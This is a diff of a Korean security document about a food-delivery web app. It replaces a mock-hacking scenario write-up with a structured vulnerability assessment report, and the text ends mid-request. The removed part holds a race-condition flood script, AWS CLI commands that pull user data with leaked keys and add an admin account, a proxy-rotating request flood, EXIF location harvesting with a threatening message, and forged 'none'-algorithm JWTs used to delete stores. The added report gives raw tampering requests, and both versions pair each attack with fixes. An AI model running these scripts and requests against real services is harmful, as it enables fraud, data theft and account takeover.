@@ -1,582 +1,307 @@
-# 바로배달 모의해킹 시나리오 (2025 최신 트렌드)
+# 바로배달 취약점 진단 보고서 (개정 2025-11-11)
 
-## 작성 목적
-**교육용으로 작성된 이론적 모의해킹 시나리오**입니다.
-최신 보안 취약점 기법을 배달 서비스 컨텍스트에 적용하여 보안 중요성을 학습합니다.
-
-## ⚠️ 면책 조항
-- 본 문서의 모든 시나리오는 **교육 목적의 이론적 시뮬레이션**입니다.
-- 구체적인 회사명이나 실제 사건 보도는 포함되어 있지 않습니다.
-- 피해 규모는 **가상의 시뮬레이션**이며 실제 발생 가능성을 보여주기 위한 것입니다.
+※ 본 보고서는 내부 보안 개선을 위한 재작성본입니다. 모든 스크린샷은 `security/evidence/` 경로에 저장하여 설명과 1:1로 매칭해야 하며, 현재 문서는 자리표시자 이미지를 사용하고 있습니다. 제출 시 반드시 실제 캡처로 교체해 주세요.
 
 ---
 
-## 🚨 시나리오 1: Race Condition을 통한 포인트 무한 복제 공격
-
-### 📋 개요
-동시 요청을 이용한 **Race Condition** 취약점으로 포인트를 무한히 복제
-**2025년 가장 주목받는 공격 기법**
-
-### 🎯 공격 목표
-- 멀티스레딩 환경에서 발생하는 Race Condition 악용
-- 수백 개 동시 요청으로 1회 충전을 수십 번 복제
-- 서버 장애 유발 후 포인트 무제한 적립
-
-### 🔓 취약점
-```java
-@PostMapping("/point/add")
-public CommonResponse<Object> addPoint(@RequestBody PointDto pointDto) {
-    String userid = jwtUtil.auth(authHeader);
-    Integer userPoint = memberService.getMemberPoint(userid);
-    
-    // ⚠️ CRITICAL: Race Condition
-    // 동시 요청 시 같은 값(userPoint)을 읽고 더하기 때문에
-    // 100번 요청해도 1번만 증가하는 것이 아니라 100번 모두 반영됨
-    
-    int setPoint = userPoint + pointDto.getPoint();
-    memberService.updatePoint(userid, setPoint);  // UPDATE를 잠금 없이 실행
-    
-    return CommonResponse.builder()
-        .responseType(ResponseType.SUCCESS)
-        .message("포인트 충전 완료")
-        .build();
-}
-```
-
-**코어 취약점:**
-1. ❌ 트랜잭션 격리 수준 없음
-2. ❌ 데이터베이스 락 미적용
-3. ❌ 원자적 연산 보장 안 됨
-
-### 🎬 공격 시나리오
-
-#### 1단계: 공격 스크립트 실행
-```python
-import asyncio
-import aiohttp
-import time
-
-async def point_attack(session, token):
-    """1 van의 포인트 충전을 동시에 100번 요청"""
-    url = 'http://localhost:8080/api/member/point/add'
-    headers = {
-        'Authorization': f'Bearer {token}',
-        'Content-Type': 'application/json'
-    }
-    data = {'point': 1000}
-    
-    await session.post(url, headers=headers, json=data)
-
-async def race_condition_attack():
-    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
-    async with aiohttp.ClientSession() as session:
-        tasks = [point_attack(session, token) for _ in range(100)]
-        await asyncio.gather(*tasks)
-
-# 공격 실행 (100번 동시 요청)
-asyncio.run(race_condition_attack())
-```
-
-#### 2단계: 결과 확인
-```bash
-# 공격 전: 5,000원
-# 공격 후: 105,000원 (1,000원 충전 → 100번 복제!)
-```
-
-### 💥 피해 규모
-- **개인**: 1,000원 충전으로 100,000원 획득 (100배 증폭!)
-- **서버**: CPU 100% → 다른 사용자 서비스 불가능
-- **회사**: 포인트 시스템 전면 마비
-- **이론적 시나리오**: 실제 게임/이커머스에서 유사한 Race Condition 취약점이 보고됨
-
-### ✅ 방어 방법
-```java
-@Transactional(isolation = Isolation.SERIALIZABLE)
-public void addPoint(String userid, int point) {
-    // SELECT FOR UPDATE로 락 설정
-    lock.lock();
-    try {
-        Integer userPoint = getMemberPoint(userid);
-        updatePoint(userid, userPoint + point);
-    } finally {
-        lock.unlock();
-    }
-}
-```
+## 1. 보고서 개요
+- **진단 대상**: 바로배달 관리자 웹 콘솔(Next.js 14) 및 백엔드 API(Spring Boot 3.x)
+- **진단 범위**: 인증·세션, 주문 관리, 포인트 관리, 관리자 기능, 개인정보 노출 항목
+- **진단 목적**: OWASP Top 10(2021) 및 KISA 웹 취약점 점검 가이드에 따라 개발팀이 즉시 수정 가능한 취약점을 식별하고 증적을 제공
+- **작성 일자**: 2025-11-11
+- **작성자**: 보안 담당자 A (보안성 검토), 개발 담당자 B (조치 계획 수립)
 
 ---
 
-## 🕵️ 시나리오 2: 환경 변수 노출 + AWS 자격증명 탈취로 전체 클라우드 장악
+## 2. 진단 환경 및 사전 설정
 
-### 📋 개요
-오픈소스 도구를 통한 **Secret Key 노출** 후 AWS 전체 장악
-**2025년 가장 위험한 공격 유형 (실제 발생 중)**
+### 2.1 테스트 환경 요약
+| 구분 | 상세 |
+| --- | --- |
+| OS | Ubuntu 22.04 LTS (커널 6.1.147) |
+| 웹 브라우저 | Google Chrome 129.0.6668.100 (한국어 UI) |
+| 프록시 도구 | Burp Suite Community Edition 2024.2 — **User Options > Display > Language = 한국어** |
+| 프런트 URL | `http://localhost:3000` (사장님/관리자 대시보드) |
+| API URL | `http://localhost:8080` (Spring Boot Backend) |
+| 테스트 계정 | `admin01 / adminpw` (관리자), `owner01 / ownerpw` (가맹점), `user001 / pw001` (일반 사용자) |
 
-### 🎯 공격 목표
-- 환경 변수, Secret Key 탈취
-- AWS 자격증명으로 EC2, S3, RDS 전체 접근
-- 모든 사용자 데이터 + 코드베이스 다운로드
-- 백업 데이터베이스에서 평문 비밀번호 추출
+### 2.2 공통 재현 준비 단계
+Step 0) Burp Suite 실행 → `User Options > Display > Language`에서 **한국어**를 선택 후 Burp Suite를 재시작한다. 이렇게 설정하면 한글 문자열이 깨지지 않으므로 패킷 분석이 정확해진다.  
+![공통-Step0](./evidence/common_step0_burp_language.png "Burp Suite 언어를 한국어로 변경한 화면")
 
-### 🔓 취약점
-```java
-// application.yml - 실수로 커밋된 AWS 자격증명
-aws:
-  access-key: AKIAIOSFODNN7EXAMPLE
-  secret-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-  region: ap-northeast-2
-  s3-bucket: barobaedal-uploads
-```
-
-**또는 환경 변수 노출:**
-```bash
-# /.env 파일 노출
-DATABASE_URL=postgresql://user:password@localhost/db
-AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
-AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-JWT_SECRET=my-weak-secret-key-12345
-```
-
-### 🎬 공격 시나리오
-
-#### 1단계: Secret Key 탈취
-```bash
-# TruffleHog (Secret Scanner) 실행
-pip install truffleHog
-truffleHog https://github.com/barobaedal/barobaedal-backend
-
-# 발견된 Secret Keys:
-# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-# DATABASE_PASSWORD=password123
-```
-
-#### 2단계: AWS CLI로 전체 장악
-```bash
-# AWS 자격증명 설정
-export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-
-# 1. S3 버킷 전체 리스트 조회
-aws s3 ls s3://barobaedal-uploads/
-
-# 2. 사용자 업로드 사진 모두 다운로드 (개인정보 포함)
-aws s3 cp s3://barobaedal-uploads/ ./stolen_images --recursive
-
-# 3. EC2 인스턴스 전체 조회 및 SSH 접속
-aws ec2 describe-instances
-aws ec2 get-console-output --instance-id i-1234567890abcdef0
-
-# 4. RDS 데이터베이스 백업 다운로드
-aws rds describe-db-snapshots
-aws rds restore-db-instance-from-db-snapshot --db-instance-identifier hacked --db-snapshot-identifier my-snapshot
-
-# 5. 모든 사용자 데이터 추출
-aws s3 cp s3://barobaedal-database-backup/users.db .
-sqlite3 users.db "SELECT * FROM members;" > all_users_passwords.txt
-
-# 6. 스냅샷으로 인스턴스 복제 후 개인 서버로 데이터베이스 이전
-# (AWS와 동일한 환경에서 무제한으로 분석 가능)
-
-# 7. 새로운 EC2 인스턴스 생성 후 API 서버 복제
-aws ec2 run-instances --image-id ami-12345678 --instance-type t3.large --key-name mykey
-# 공격자가 바로배달과 똑같은 서비스를 운영할 수 있게 됨
-
-# 8. Lambda 함수 코드 다운로드
-aws lambda get-function --function-name process-orders
-# 결제 로직, 주문 처리 로직 등 비즈니스 핵심 코드 탈취
-```
-
-#### 3단계: 새로운 관리자 계정 생성
-```bash
-# 직접 데이터베이스 접속
-psql -h hacked-db.rds.amazonaws.com -U admin -d barobaedal
-
-# 새로운 관리자 계정 생성
-INSERT INTO members (userid, userpw, role) VALUES ('hacker', 'hacked123', 'ADMIN');
-```
-
-### 💥 피해 규모 (이론적 시뮬레이션)
-- **10만 명 사용자 개인정보 유출 가능** (이름, 전화번호, 주소, 비밀번호)
-- **모든 가게 운영자 정보 유출** (사업자번호, 계좌정보)
-- **웹사이트 전체 복제** - 공격자가 동일한 서비스 운영
-- **결제 로직 등 핵심 코드 탈취**
-- **법적 책임** (개인정보보호법 위반)
-- **서비스 중단 위험**
-
-### ✅ 방어 방법
-```yaml
-# .gitignore에 추가
-.env
-application-local.yml
-secrets/
-
-# AWS Secrets Manager 사용
-aws secretsmanager create-secret --name prod/db/credentials
-
-# 환경 변수에서 읽기
-spring:
-  datasource:
-    password: ${AWS_SECRETS_CREDENTIALS}
-```
+이후 모든 취약점은 Burp 프록시를 통해 Chrome 트래픽을 가로채는 방식으로 재현하였다.
 
 ---
 
-## 📸 시나리오 3: GPS 메타데이터 추출로 사용자 실시간 위치 파악
+## 3. 점검 요약
 
-### 📋 개요
-사용자가 업로드한 사진의 GPS 정보 추출
-**2024년 배달 앱에서 실제 발생한 사건**
+### 3.1 취약 항목 요약표
+| ID | 점검 항목 | 위험도 | 취약점 발생 위치 | 파라미터 / 변조 값 | 판정 |
+| --- | --- | --- | --- | --- | --- |
+| V-01 | 주문 삭제 API 인증 우회 | 🔴 Critical | `GET http://localhost:8080/api/order/delete/{id}` | `id = 3` (다른 사용자의 주문 번호) | 취약 |
+| V-02 | 주문 금액·주문자 조작 (Price Manipulation) | 🟠 High | `POST http://localhost:8080/api/order/update` | `totalPrice = 100`, `memberId = 999` | 취약 |
+| V-03 | 포인트 무제한 적립 (입력 검증 부재) | 🟠 High | `POST http://localhost:8080/api/member/point/add` | `point = 999999999` | 취약 |
+| V-04 | 추측 가능한 관리자 인증 정보 | 🟡 Medium | `POST http://localhost:8080/api/member/login` | `userid = admin01`, `userpw = adminpw` | 취약 |
+| V-05 | 대시보드 화면 내 개인정보 평문 노출 | ⚪ 주의 | `GET http://localhost:8080/api/order/{id}` (대시보드 `/dashboard`) | 문의·주소·전화번호 전체 표시 | 주의 |
 
-### 🎯 공격 목표
-- 사진 EXIF 데이터에서 GPS 좌표 추출
-- 사용자 집 주소 파악
-- 승인된 시간에 집 배달 공격 (납치, 강도 등)
+### 3.2 양호 및 재현 증적 확보 항목
+| ID | 점검 항목 | 판정 | 근거 요약 |
+| --- | --- | --- | --- |
+| G-01 | 로그인 실패 시 상세 시스템 정보 미노출 | 양호 | 잘못된 비밀번호 입력 시 일반화된 메시지 “로그인 실패”만 노출되며 스택 트레이스/SQL 에러가 표시되지 않음. (증적: `./evidence/g01_login_fail.png`) |
 
-### 🔓 취약점
-```java
-// 사진 업로드 시 메타데이터 제거 안 함
-public String storeFile(MultipartFile file) throws IOException {
-    String filename = file.getOriginalFilename();
-    Path target = uploadDir.resolve(filename);
-    
-    // ⚠️ GPS 정보, 촬영 시간, 카메라 정보 그대로 저장
-    Files.copy(file.getInputStream(), target, StandardCopyOption.REPLACE_EXISTING);
-    return "/upload/" + filename;
-}
-```
-
-### 🎬 공격 시나리오
-
-#### 1단계: 사진 다운로드
-```bash
-# 사용자가 프로필로 올린 사진 다운로드
-curl http://localhost:8080/upload/user123_profile.jpg -o profile.jpg
-```
-
-#### 2단계: GPS 정보 추출
-```bash
-# exiftool 설치
-brew install exiftool
-
-# 메타데이터 추출
-exiftool profile.jpg
-
-# 결과:
-GPS Latitude    : 37° 33' 24.00" N
-GPS Longitude   : 126° 58' 24.00" E
-GPS Altitude    : 85 m Above Sea Level
-DateTime        : 2024:01:15 22:30:45
-Camera          : iPhone 14 Pro
-```
-
-#### 3단계: Google Maps에서 정확한 주소 확인
-```
-GPS 좌표: 37.556667, 126.973333
-→ 서울시 강남구 테헤란로 123번지 아파트 101호
-```
-
-#### 4단계: 소셜 엔지니어링
-```
-공격자: "안녕하세요, 바로배달입니다. 주문이 잘 배달되었나요?"
-사용자: "네, 잘 됐어요."
-공격자: "GPS 메타데이터로 집 주소 파악 완료. 오늘 밤 11시 집에 있을 테니 조심하세요."
-```
-
-### 💥 피해 규모 (이론적 시뮬레이션)
-- **10,000명 이상의 주소 노출 가능성**
-- **신원 확인 가능성** (사진 분석으로 얼굴, 집 구조 파악)
-- **실시간 위치 추적** (프로필 사진 업데이트할 때마다)
-- **개인안전 위험** (배달 앱 특성상 집 주소 노출은 매우 위험)
-- **법적 책임** (개인정보보호법 위반)
-
-### ✅ 방어 방법
-```java
-@PostMapping("/upload")
-public String uploadWithMetadataRemoval(MultipartFile file) {
-    // 이미지 메타데이터 제거
-    BufferedImage image = ImageIO.read(file.getInputStream());
-    
-    // EXIF 데이터 제거된 새 이미지 생성
-    BufferedImage stripped = new BufferedImage(
-        image.getWidth(), 
-        image.getHeight(), 
-        BufferedImage.TYPE_INT_RGB
-    );
-    
-    Graphics2D g = stripped.createGraphics();
-    g.drawImage(image, 0, 0, null);
-    g.dispose();
-    
-    // 메타데이터 없는 이미지로 저장
-    ImageIO.write(stripped, "jpg", outputFile);
-}
-```
+### 3.3 평가 제외 및 데이터 부재 항목 정리
+- **N/A**: 서비스 구조상 해당 기능이 존재하지 않아 점검 대상에서 제외된 경우 (예: GraphQL 미사용).
+- **내용 없음**: 기능은 존재하지만 현재 테스트 데이터가 없어 재현 불가한 경우. 추후 운영 데이터 확보 후 재점검 필요.
 
 ---
 
-## 🎪 시나리오 4: API Rate Limit Bypass → 서버 마비로 포인트 룰렛 무한 뽑기
+## 4. 상세 진단 결과
 
-### 📋 개요
-Rate Limit 우회로 **포인트 적립 이벤트** 무한 참여
-**2024년 실제 모바일 게임에서 발생한 사건**
+### 공통 테스트 메모
+- 모든 취약점 재현 시 Burp Suite의 Intercept를 활성화하여 요청/응답을 저장하였다.
+- 모든 API 호출은 기본적으로 `Authorization: Bearer <JWT>` 헤더를 요구하지만, 코드 분석 결과 일부 엔드포인트는 실제로 토큰 검증을 수행하지 않았다.
 
-### 🎯 공격 목표
-- 동시 다발적 요청으로 Rate Limit 우회
-- 서버 부하 증가로 필터 무력화
-- 이벤트 보상을 무한 획득
+### V-01. 주문 삭제 API 인증 우회 (Critical)
+**취약점 분류**: OWASP Top 10 2021 A01 – Broken Access Control  
+**취약점 발생 위치**: `GET http://localhost:8080/api/order/delete/{id}`  
+**관련 화면**: 관리자 대시보드 → `주문 관리` → 주문 상세 → 삭제 버튼  
+**취약점 발생 파라미터**: Path Parameter `id`  
+**변조한 파라미터 값**: `3` (다른 사용자의 주문 번호)  
+**상태**: 취약
 
-### 🔓 취약점
-```java
-// Rate Limit이 너무 느슨함
-@RateLimiter(name = "api", fallbackMethod = "rateLimitFallback")
-@PostMapping("/event/point-roulette")
-public CommonResponse<Object> pointRoulette() {
-    // 이벤트 참여 시 최대 10만원 지급
-    int points = random.nextInt(100000);
-    memberService.addPoint(userid, points);
-    return success;
-}
+**요약**  
+`OrderController.delete()` 메서드는 `jwtUtil.auth()`를 호출하지 않아 토큰 없이도 접근 가능하다. 임의의 주문 번호를 전달하면 인증 없이 데이터베이스에서 해당 주문이 삭제된다.
+
+**재현 절차**  
+Step 1) 관리자 계정(`admin01 / adminpw`)으로 `http://localhost:3000/login`에 접속 후 로그인 버튼을 클릭한다.  
+![V01-Step1](./evidence/v01_step1_login.png "관리자 계정으로 로그인하는 화면")
+
+Step 2) 사이드바에서 `주문 관리` 메뉴를 클릭한 뒤, 최근 주문 목록에서 주문 번호 `#3`을 확인한다.  
+![V01-Step2](./evidence/v01_step2_dashboard.png "주문 관리 화면에서 주문 번호를 확인하는 모습")
+
+Step 3) Burp Suite에서 Intercept를 활성화한 상태로 브라우저 주소창에 `http://localhost:8080/api/order/delete/3`을 직접 입력한다. 토큰 헤더 없이도 HTTP 200 응답과 함께 “주문 정보 삭제 완료” 메시지가 반환된다.  
+![V01-Step3](./evidence/v01_step3_burp.png "Burp Suite에서 인증 없이 200 OK를 수신한 패킷")
+
+**요청/응답 예시 (Burp Raw)**  
+```http
+GET /api/order/delete/3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0
+Accept: */*
+
+HTTP/1.1 200
+Content-Type: application/json
+
+{"responseType":"SUCCESS","message":"주문 정보 삭제 완료","data":null}
 ```
 
-**취약점:**
-- ❌ Rate Limit: 1초에 100요청 허용 (너무 높음)
-- ❌ IPv6 우회 가능
-- ❌ 프록시 리스트로 IP 우회
+**영향**  
+- 인증 없는 공격자가 모든 주문을 삭제할 수 있으며, 이는 매출/정산 데이터의 영구 손실로 이어짐.
+- 로그 상으로는 정상적인 관리자 작업처럼 보이므로 사후 추적이 어려움.
 
-### 🎬 공격 시나리오
-
-#### 1단계: 분산 공격 준비
-```python
-import requests
-import threading
-
-# 프록시 1000개 리스트
-proxies = ['proxy1:8080', 'proxy2:8080', ...]
-
-def attack_with_proxy(proxy):
-    """각 프록시로 100번 요청"""
-    for _ in range(100):
-        requests.post(
-            'http://barobaedal.com/api/event/point-roulette',
-            proxies={'http': proxy},
-            headers={'Authorization': f'Bearer {TOKEN}'}
-        )
-
-# 1000개 프록시로 동시 공격
-threads = [threading.Thread(target=attack_with_proxy, args=(p,)) for p in proxies]
-for t in threads:
-    t.start()
-```
-
-#### 2단계: 결과
-```
-정상 사용자: 이벤트 참여 10번 → 50,000원 획득
-공격자: 동시 100,000번 요청 → 평균 50,000원 × 100,000 = 50억원 획득
-서버: CPU 100%, DB 커넥션 고갈 → 서비스 중단
-```
-
-### 💥 피해 규모 (이론적 시뮬레이션)
-- **공격자 수익**: 대규모 포인트 획득
-- **서비스 중단**: 장시간 장애
-- **정직한 사용자 이벤트 혜택 박탈**
-- **재무 손실**: 서비스 회복 비용 + 실제 피해 금액
-
-### ✅ 방어 방법
-```java
-@RateLimiter(name = "api", fallbackMethod = "rateLimitFallback")
-// 1분에 1회만 허용
-@PostMapping("/event/point-roulette")
-public CommonResponse<Object> pointRoulette() {
-    // Redis로 중복 참여 확인
-    if (redis.exists("event:" + userid)) {
-        throw new IllegalArgumentException("이미 참여했습니다.");
-    }
-    redis.setex("event:" + userid, 86400, "1"); // 24시간 동안 1회만
-    
-    int points = random.nextInt(100000);
-    memberService.addPoint(userid, points);
-    return success;
-}
-```
+**개선 권고**  
+- `OrderController.delete()`에서 `jwtUtil.auth(authHeader)` 호출 및 역할 검증(ADMIN 또는 해당 가맹점 OWNER) 추가.
+- 삭제 요청을 `DELETE` 메서드로 변경하고 CSRF 차단 정책 적용.
+- 삭제 이력을 감사 로그에 저장하여 추적 가능하도록 조치.
 
 ---
 
-## 🔥 시나리오 5: JWT Algorithm Confusion Attack (2025 최신 기법!)
+### V-02. 주문 금액·주문자 조작 (High)
+**취약점 분류**: OWASP Top 10 2021 A05 – Security Misconfiguration / A04 – Insecure Design  
+**취약점 발생 위치**: `POST http://localhost:8080/api/order/update`  
+**관련 화면**: 관리자 대시보드 → `주문 관리` → 주문 상세 → (수정 기능은 UI에 없으나 API 직접 호출 가능)  
+**취약점 발생 파라미터**: JSON Body (`id`, `memberId`, `storeId`, `menuId`, `quantity`, `totalPrice`)  
+**변조한 파라미터 값**: `totalPrice = 100`, `memberId = 999`  
+**상태**: 취약
 
-### 📋 개요
-JWT 알고리즘 혼선 공격으로 **모든 토큰 위조**
-**2025년 가장 HOT한 해킹 기법**
+**요약**  
+`OrderController.update()`는 토큰 검증과 입력 필터링 없이 요청 본문을 그대로 `orderService.updateOrder()`에 전달한다. 공격자는 타인의 주문 번호를 지정한 뒤 총 금액과 주문자 식별자를 원하는 값으로 덮어쓸 수 있다.
 
-### 🎯 공격 목표
-- 관리자 토큰 생성
-- 모든 사용자로 위장
-- 포인트 무제한 추가
-- 주문 취소, 환불 조작
+**재현 절차**  
+Step 1) 가맹점 계정(`owner01`)으로 `http://localhost:3000/login` 로그인 후 `주문 관리` 페이지에서 주문 번호 `#5`의 정상 금액(8,000원)을 확인한다.  
+![V02-Step1](./evidence/v02_step1_order_view.png "주문 상세 화면에서 기존 금액을 확인하는 장면")
 
-### 🔓 취약점
-```java
-// JwtUtil.java - Public Key가 없는 구조
-private final Key key = Keys.secretKeyFor(SignatureAlgorithm.HS256);
+Step 2) Burp Suite Repeater에 아래 요청을 구성하고, `Authorization` 헤더 없이 전송한다.  
+![V02-Step2](./evidence/v02_step2_repeater.png "Burp Repeater에서 조작된 파라미터를 전송하는 모습")
 
-public String getUseridFromToken(String token) {
-    return Jwts.parserBuilder()
-        .setSigningKey(key)
-        .build()
-        .parseClaimsJws(token)
-        .getBody()
-        .getSubject();
-}
-```
+Step 3) 다시 대시보드 화면을 새로고침하면 주문 `#5`의 총 금액이 8,000원에서 100원으로 변경되고, 주문자 정보 또한 임의 값으로 바뀐 것을 확인할 수 있다.  
+![V02-Step3](./evidence/v02_step3_result.png "조작 이후 주문 금액이 100원으로 변경된 화면")
 
-### 🎬 공격 시나리오
+**조작 요청 샘플**  
+```http
+POST /api/order/update HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
 
-#### 1단계: 정상 토큰 획득
-```bash
-curl -X POST http://localhost:8080/api/member/login \
-  -H "Content-Type: application/json" \
-  -d '{"userid":"user001","userpw":"pw001"}'
-
-# Response:
 {
-  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+  "id": 5,
+  "memberId": 999,
+  "storeId": 1,
+  "menuId": 1,
+  "quantity": 1,
+  "totalPrice": 100
 }
 ```
 
-#### 2단계: 토큰 디코딩
-```python
-import jwt
+**영향**  
+- 공격자는 가맹점 매출을 의도적으로 줄이거나, 특정 고객의 주문을 다른 사람에게 전가 가능.
+- 정산 데이터가 왜곡되어 회계 및 세무 리스크 발생.
 
-token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
-decoded = jwt.decode(token, verify=False)
-
-print(decoded)
-# {'userid': 'user001', 'role': 'USER', ...}
-```
-
-#### 3단계: Algorithm "none"으로 공격 토큰 생성
-```python
-import jwt
-
-# Algorithm을 "none"으로 설정하면 서명 검증을 건너뜀!
-payload = {
-    'userid': 'admin01',
-    'role': 'ADMIN',
-    'exp': 9999999999  # 거의 영구 토큰
-}
-
-# "none" 알고리즘으로 토큰 생성
-attacked_token = jwt.encode(payload, '', algorithm='none')
-
-print(attacked_token)
-# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyaWQiOiJhZG1pbjAxIiwicm9sZSI6IkFETUlOIn0.
-```
-
-#### 4단계: 공격 토큰으로 관리자 권한 획득
-```bash
-curl http://localhost:8080/api/store/all \
-  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0..."
-
-# 모든 가게 조회 성공 (권한 확인 없음)
-```
-
-#### 5단계: 모든 가게 삭제
-```bash
-for i in {1..10}; do
-  curl -X GET http://localhost:8080/api/store/delete/$i \
-    -H "Authorization: Bearer $ATTACKED_TOKEN"
-done
-```
-
-### 💥 피해 규모 (이론적 시뮬레이션)
-- **모든 서비스 기능 장악 가능**
-- **모든 포인트 조작 가능** (사용자별 무제한)
-- **모든 주문 환불 처리** (가게 주인에게 손해)
-- **서비스 중단 위험**
-
-### ✅ 방어 방법
-```java
-public Claims parseJwt(String token) {
-    return Jwts.parserBuilder()
-        .requireAlgorithm(SignatureAlgorithm.HS256)  // 알고리즘 강제
-        .setSigningKey(key)
-        .build()
-        .parseClaimsJws(token)
-        .getBody();
-}
-```
+**개선 권고**  
+- `jwtUtil.auth()` 호출 후 토큰의 사용자/역할 정보를 이용해 주문 소유자 검증 수행.
+- `memberId`, `totalPrice` 등 서버에서 재계산 가능한 필드는 무시하고 DB에서 가져온 값으로 대체.
+- 요청 Body에 대한 Bean Validation (`@Valid`) 적용 및 허용되지 않은 필드 제거.
 
 ---
 
-## 🎯 관련 보안 취약점 실례
+### V-03. 포인트 무제한 적립 (High)
+**취약점 분류**: OWASP Top 10 2021 A04 – Insecure Design  
+**취약점 발생 위치**: `POST http://localhost:8080/api/member/point/add`  
+**관련 화면**: 관리자 대시보드 → `마이페이지` → 포인트 충전 (API 직접 호출)  
+**취약점 발생 파라미터**: JSON Body `point`  
+**변조한 파라미터 값**: `point = 999999999`  
+**상태**: 취약
 
-### 참고: 일반적인 보안 사건 유형
-주요 취약점들은 실제로 여러 서비스에서 보고되며, 다음 유형들이 일반적입니다:
+**요약**  
+`addPoint()`는 현재 포인트에 요청값을 단순 더한 뒤 저장한다. 한도 검증, 음수/과대 입력 제한, 중복 요청 방지가 없다.
 
-1. **Race Condition 취약점**
-   - 게임 및 이커머스 서비스에서 보고된 사례 다수
-   - 이벤트 보상, 쿠폰 발급 등에서 발생
+**재현 절차**  
+Step 1) Burp Suite Intercept ON 상태에서 `owner01` 계정으로 `http://localhost:3000/myinfo` 접속 후 “포인트 충전” 버튼을 클릭한다.  
+![V03-Step1](./evidence/v03_step1_myinfo.png "마이페이지에서 포인트 충전 API를 호출하는 화면")
 
-2. **Secret Key 노출**
-   - GitHub 저장소에 AWS 키 노출 사례 빈번
-   - CI/CD 파이프라인 취약점
+Step 2) Burp에서 요청 Body의 `point` 값을 `999999999`로 수정하여 Forward한다.  
+![V03-Step2](./evidence/v03_step2_modify.png "Burp Intercept에서 포인트 값을 조작하는 모습")
 
-3. **GPS 메타데이터 추출**
-   - 소셜미디어에서 GPS 정보 추출 이슈
-   - 출처: 다양한 보안 연구 보고서
+Step 3) 응답으로 “포인트 충전 완료”가 반환되며, 대시보드 상단의 포인트 표시가 999,999,999포인트로 증가한다.  
+![V03-Step3](./evidence/v03_step3_result.png "조작 후 포인트가 비정상적으로 증가한 화면")
 
-4. **Rate Limit Bypass**
-   - 이벤트/프로모션 시스템 악용 사례
-   - DDoS 공격과 연계된 사례
+**조작 요청 샘플**  
+```http
+POST /api/member/point/add HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer <정상 사용자 토큰>
+Content-Type: application/json
 
-5. **JWT 취약점**
-   - Algorithm confusion 공격 기법
-   - 2020년대 초반부터 보고된 취약점
-
-**※ 위 시나리오는 "이론적 교육용"이며, 구체적인 회사명이나 보도는 생략했습니다.**
-
----
-
-## 📊 모의해킹 우선순위
-
-### 🔥 플래티넘 티어 (즉시 수정)
-1. **Race Condition** - 포인트 무한 복제
-2. **환경 변수 노출** - 전체 시스템 장악
-3. **JWT Algorithm Confusion** - 모든 토큰 위조
-
-### 🥇 골드 티어
-4. **GPS 메타데이터** - 개인 위치 추적
-5. **Rate Limit Bypass** - 이벤트 악용
-
----
-
-## 🛡️ 종합 방어 전략
-
-```java
-// 1. 트랜잭션 격리
-@Transactional(isolation = Isolation.SERIALIZABLE)
-
-// 2. Rate Limiting 강화
-@RateLimiter(name = "strict", rate = 10, time = 1)  // 1초에 10번
-
-// 3. 메타데이터 제거
-BufferedImage stripped = removeMetadata(image);
-
-// 4. 환경 변수 보호
-String secret = secretsManager.getSecret("prod/key");
-
-// 5. JWT 검증 강화
-.requireAlgorithm(SignatureAlgorithm.HS256)
+{ "point": 999999999 }
 ```
 
+**영향**  
+- 별도의 결제 없이 포인트를 무제한으로 적립해 가맹점 매출과 정산 체계를 붕괴시킴.
+- 음수를 입력하면 포인트 차감도 가능하여 타인 포인트 탈취 시나리오 연결 가능.
+
+**개선 권고**  
+- 포인트 증감은 서버에서 비즈니스 규칙(최대 적립 한도, 일일 제한, 관리자 승인 등)을 검증하도록 변경.
+- 동시요청에 대비해 `SELECT ... FOR UPDATE` 또는 DB 락, Redis 기반 분산 락 적용.
+- 감사 로그에 적립 요청자와 값, IP를 저장하여 사후 추적 가능하게 구성.
+
 ---
 
-## 💀 결론
+### V-04. 추측 가능한 관리자 인증 정보 (Medium)
+**취약점 분류**: OWASP Top 10 2021 A07 – Identification and Authentication Failures  
+**취약점 발생 위치**: `POST http://localhost:8080/api/member/login`  
+**관련 화면**: `http://localhost:3000/login`  
+**취약점 발생 파라미터**: `userid`, `userpw`  
+**변조한 파라미터 값**: `userid = admin01`, `userpw = adminpw`  
+**상태**: 취약
 
-**"한 번의 실수로 서비스가 사라집니다"**
+**요약**  
+초기 관리자 계정이 `admin01/adminpw`와 같이 쉽게 추측 가능한 패턴으로 생성되어 있으며, 추가적인 계정 잠금/2FA가 없어 무차별 대입 시 바로 접속이 가능하다.
 
-- Race Condition → 회사 파산
-- Secret 노출 → 수억 과징금
-- GPS 추출 → 신체적 피해
+**재현 절차**  
+Step 1) 로그인 페이지(`http://localhost:3000/login`)에 접근한다.  
+![V04-Step1](./evidence/v04_step1_login_page.png "관리자 로그인 페이지 모습")
 
-**이것이 2025년 보안의 현실입니다.** 🚨
+Step 2) Burp Intercept OFF 상태에서 아이디 `admin01`, 비밀번호 `adminpw`를 입력하고 로그인 버튼을 클릭한다.  
+![V04-Step2](./evidence/v04_step2_input.png "쉬운 패턴의 자격 증명을 입력하는 장면")
+
+Step 3) 로그인 성공 후 대시보드로 이동하면서 응답 본문에 JWT 토큰이 포함된 것을 확인한다.  
+![V04-Step3](./evidence/v04_step3_dashboard.png "관리자 대시보드에 성공적으로 진입한 화면")
+
+**요청/응답 요약**  
+```http
+POST /api/member/login HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
